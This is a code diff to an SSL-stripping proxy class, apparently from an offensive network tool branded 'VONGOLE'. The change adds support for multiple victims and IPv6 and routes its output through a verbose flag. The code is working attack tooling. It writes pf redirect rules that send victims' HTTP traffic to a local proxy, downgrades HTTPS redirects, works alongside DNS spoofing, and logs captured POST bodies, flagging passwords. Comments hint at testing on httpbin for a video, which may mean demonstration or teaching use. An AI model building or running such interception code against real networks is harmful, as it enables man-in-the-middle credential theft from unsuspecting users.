@@ -27,10 +27,10 @@ class SSLStripper:
     SSL Stripper
     """
 
-    def __init__(self, interface, packet_handler=None, target_ip=None):
+    def __init__(self, interface, packet_handler=None, target_ips=None, verbose=False):
         self.interface = interface
         self.packet_handler = packet_handler
-        self.target_ip = target_ip
+        self.target_ips = target_ips
         self.running = False
         self.proxy_port = 10000
         # Also listen on port 80 for DNS-spoofed connections.
@@ -40,6 +40,8 @@ class SSLStripper:
         self.proxy_thread = None
         self.http_thread = None
         self.stripped_count = 0
+
+        self.verbose = verbose
 
         # Track active HTTPS connections per domain
         self.https_domains = set()
@@ -52,8 +54,27 @@ class SSLStripper:
         # PF config
         self.pf_conf_file = "/tmp/sslstrip_final.conf"
         self.local_ip = None
+        self.local_ipv6 = None
 
         logger.info("SSL Stripper initialized")
+
+    def _get_interface_ipv6(self):
+        try:
+            import socket
+            import psutil
+            for name, addrs in psutil.net_if_addrs().items():
+                if name == self.interface:
+                    for a in addrs:
+                        if a.family == socket.AF_INET6:
+                            if not a.address.startswith('fe80'):
+                                return a.address
+                    # Return link-local if thats all we have
+                    for a in addrs:
+                        if a.family == socket.AF_INET6:
+                            return a.address
+        except:
+            pass
+        return None
 
     def start(self):
         """Start SSL stripping proxy"""
@@ -64,6 +85,10 @@ class SSLStripper:
         if not self.local_ip:
             logger.error("Could not determine interface IP")
             return False
+
+        self.local_ipv6 = self._get_interface_ipv6()
+        if self.local_ipv6 and self.verbose:
+            logger.info(f"IPv6 address: {self.local_ipv6}")
 
         # Setup traffic redirection (only for intercepted traffic, not DNS-spoofed)
         if not self._setup_traffic_redirection():
@@ -119,13 +144,11 @@ class SSLStripper:
 
             self.http_thread.start()
 
-            print(f"\n{Fore.GREEN}SSL Stripper Active!{Style.RESET_ALL}")
-            print(
-                f"{Fore.CYAN}Proxy on port {self.proxy_port} (redirected traffic){Style.RESET_ALL}")
-            print(
-                f"{Fore.CYAN}HTTP on port {self.http_port} (DNS-spoofed traffic){Style.RESET_ALL}")
-            print(
-                f"{Fore.YELLOW}Victim connects via HTTP -> We connect via HTTPS{Style.RESET_ALL}\n")
+            if self.verbose:
+                print(f"\nSSL Stripper Active!")
+                print(f"Proxy on port {self.proxy_port} (redirected traffic)")
+                print(f"HTTP on port {self.http_port} (DNS-spoofed traffic)")
+                print(f"Victim connects via HTTP -> We connect via HTTPS\n")
 
             return True
 
@@ -148,19 +171,63 @@ class SSLStripper:
             return None
 
     def _setup_traffic_redirection(self):
-        """Setup PF rules for traffic redirection"""
+        """Setup PF rules for traffic redirection - UPDATED FOR MULTIPLE TARGETS"""
         try:
-            # DONT TOUCH THIS ITS LIKE HELLA DELICATE
+            # Build redirect rules for EACH target
+            redirect_rules = []
+
+            for target_ip in self.target_ips:
+                # Add IPv4 rules for this target
+                redirect_rules.append(f"# Rules for target {target_ip}")
+                redirect_rules.append(
+                    f"rdr pass on {self.interface} inet proto tcp from {target_ip} to any port 80 -> {self.local_ip} port {self.proxy_port}"
+                )
+                redirect_rules.append(
+                    f"rdr pass on {self.interface} inet proto tcp from {target_ip} to {self.local_ip} port 80 -> {self.local_ip} port {self.proxy_port}"
+                )
+
+            # Join all redirect rules
+            redirect_section = '\n'.join(redirect_rules)
+
+            # NOTE: DONT TOUCH THIS ITS LIKE HELLA DELICATE
             pf_rules = f"""
 # Redirect HTTP traffic to our proxy (from intercepts)
-rdr pass on {self.interface} inet proto tcp from {self.target_ip} to any port 80 -> {self.local_ip} port {self.proxy_port}
-
-# Also redirect DNS-spoofed traffic (connections TO us on port 80)
-rdr pass on {self.interface} inet proto tcp from {self.target_ip} to {self.local_ip} port 80 -> {self.local_ip} port {self.proxy_port}
+{redirect_section}
 
 # Allow proxy's outbound connections
 pass out on {self.interface} inet proto tcp from {self.local_ip} to any port {{80, 443}} keep state
 pass in on {self.interface} inet proto tcp from any to {self.local_ip} port {self.proxy_port} keep state
+"""
+
+            # If we have IPv6, add IPv6 rules too
+            if hasattr(self, 'local_ipv6') and self.local_ipv6:
+                ipv6_redirect_rules = []
+
+                for target_ip in self.target_ips:
+                    # Only add IPv6 rules if target looks like IPv6
+                    if ':' in target_ip:
+                        ipv6_redirect_rules.append(
+                            f"rdr pass on {self.interface} inet6 proto tcp from {target_ip} to any port 80 -> {self.local_ipv6} port {self.proxy_port}"
+                        )
+                        ipv6_redirect_rules.append(
+                            f"rdr pass on {self.interface} inet6 proto tcp from {target_ip} to {self.local_ipv6} port 80 -> {self.local_ipv6} port {self.proxy_port}"
+                        )
+
+                # NOTE: ALSO ODNT TOUCH IT DONT LIKE TAB IT OR ANYTHING
+                if ipv6_redirect_rules:
+                    ipv6_section = '\n'.join(ipv6_redirect_rules)
+                    pf_rules = f"""
+# IPv4 Rules
+{redirect_section}
+
+# IPv6 Rules
+{ipv6_section}
+
+# Allow proxy's outbound connections (IPv4 and IPv6)
+pass out on {self.interface} inet proto tcp from {self.local_ip} to any port {{80, 443}} keep state
+pass out on {self.interface} inet6 proto tcp from {self.local_ipv6} to any port {{80, 443}} keep state
+pass in on {self.interface} inet proto tcp from any to {self.local_ip} port {self.proxy_port} keep state
+pass in on {self.interface} inet6 proto tcp from any to {self.local_ipv6} port {self.proxy_port} keep state
 """
 
             with open(self.pf_conf_file, "w") as f:
@@ -171,6 +238,10 @@ pass in on {self.interface} inet proto tcp from any to {self.local_ip} port {sel
             subprocess.run(["sudo", "pfctl", "-e"], check=False)
 
             logger.info("[VONGOLE] PF rules loaded")
+            if self.verbose:
+                logger.debug(
+                    f"Loaded PF rules for {len(self.target_ips)} targets")
+
             return True
 
         except Exception as e:
@@ -457,22 +528,22 @@ pass in on {self.interface} inet proto tcp from any to {self.local_ip} port {sel
                 return
 
             # Log POST data if exists TODO like actually maek this proper and maybe look at other stuff but anyways i tested w httbin post maybe we cna use this in the video idk idkidkeadjoieskl rnwo im literally just scanning for password= not robust etc
-            if request.startswith(b'POST '):
+            if request.startswith(b'POST ') and self.verbose:
                 body_start = request.find(b'\r\n\r\n') + 4
                 post_data = request[body_start:]
 
                 if post_data:
-                    print(f"\n{Fore.RED} CAPTURED POST DATA  "
-                          f"{Style.RESET_ALL}({client_addr[0]} -> {host})")
-                    print(f"{Fore.YELLOW}{post_data.decode('utf-8', errors='ignore')}"
-                          f"{Style.RESET_ALL}")
+                    logger.info(
+                        f"CAPTURED POST DATA ({client_addr[0]} -> {host})")
+                    logger.info(
+                        f"{post_data.decode('utf-8', errors='ignore')}")
 
                     lower = post_data.lower()
                     if b'password' in lower or b'pass=' in lower:
-                        print(f"{Fore.RED} PASSWORD DETECTED!"
-                              f"{Style.RESET_ALL}\n")
+                        logger.warning("PASSWORD DETECTED!")
 
-            logger.info(f"[VONGOLE] Request for {host}")
+            if self.verbose:
+                logger.info(f"[VONGOLE] Request for {host}")
 
             # Decide protocol (HTTP first unless domain known for HTTPS) Tehcnically we are using this because we know its https but whatever i think its a bit more robust htis way
             use_https = (
@@ -494,8 +565,9 @@ pass in on {self.interface} inet proto tcp from any to {self.local_ip} port {sel
 
                     # HTTPS redirect?
                     if self._is_https_redirect(response):
-                        print(f"\n{Fore.RED}[VONGOLE] SSL STRIPPING: {host}"
-                              f"{Style.RESET_ALL}")
+                        if self.verbose:
+                            logger.info(f"[VONGOLE] SSL STRIPPING: {host}")
+
                         self.stripped_count += 1
                         self.https_domains.add(host)
 
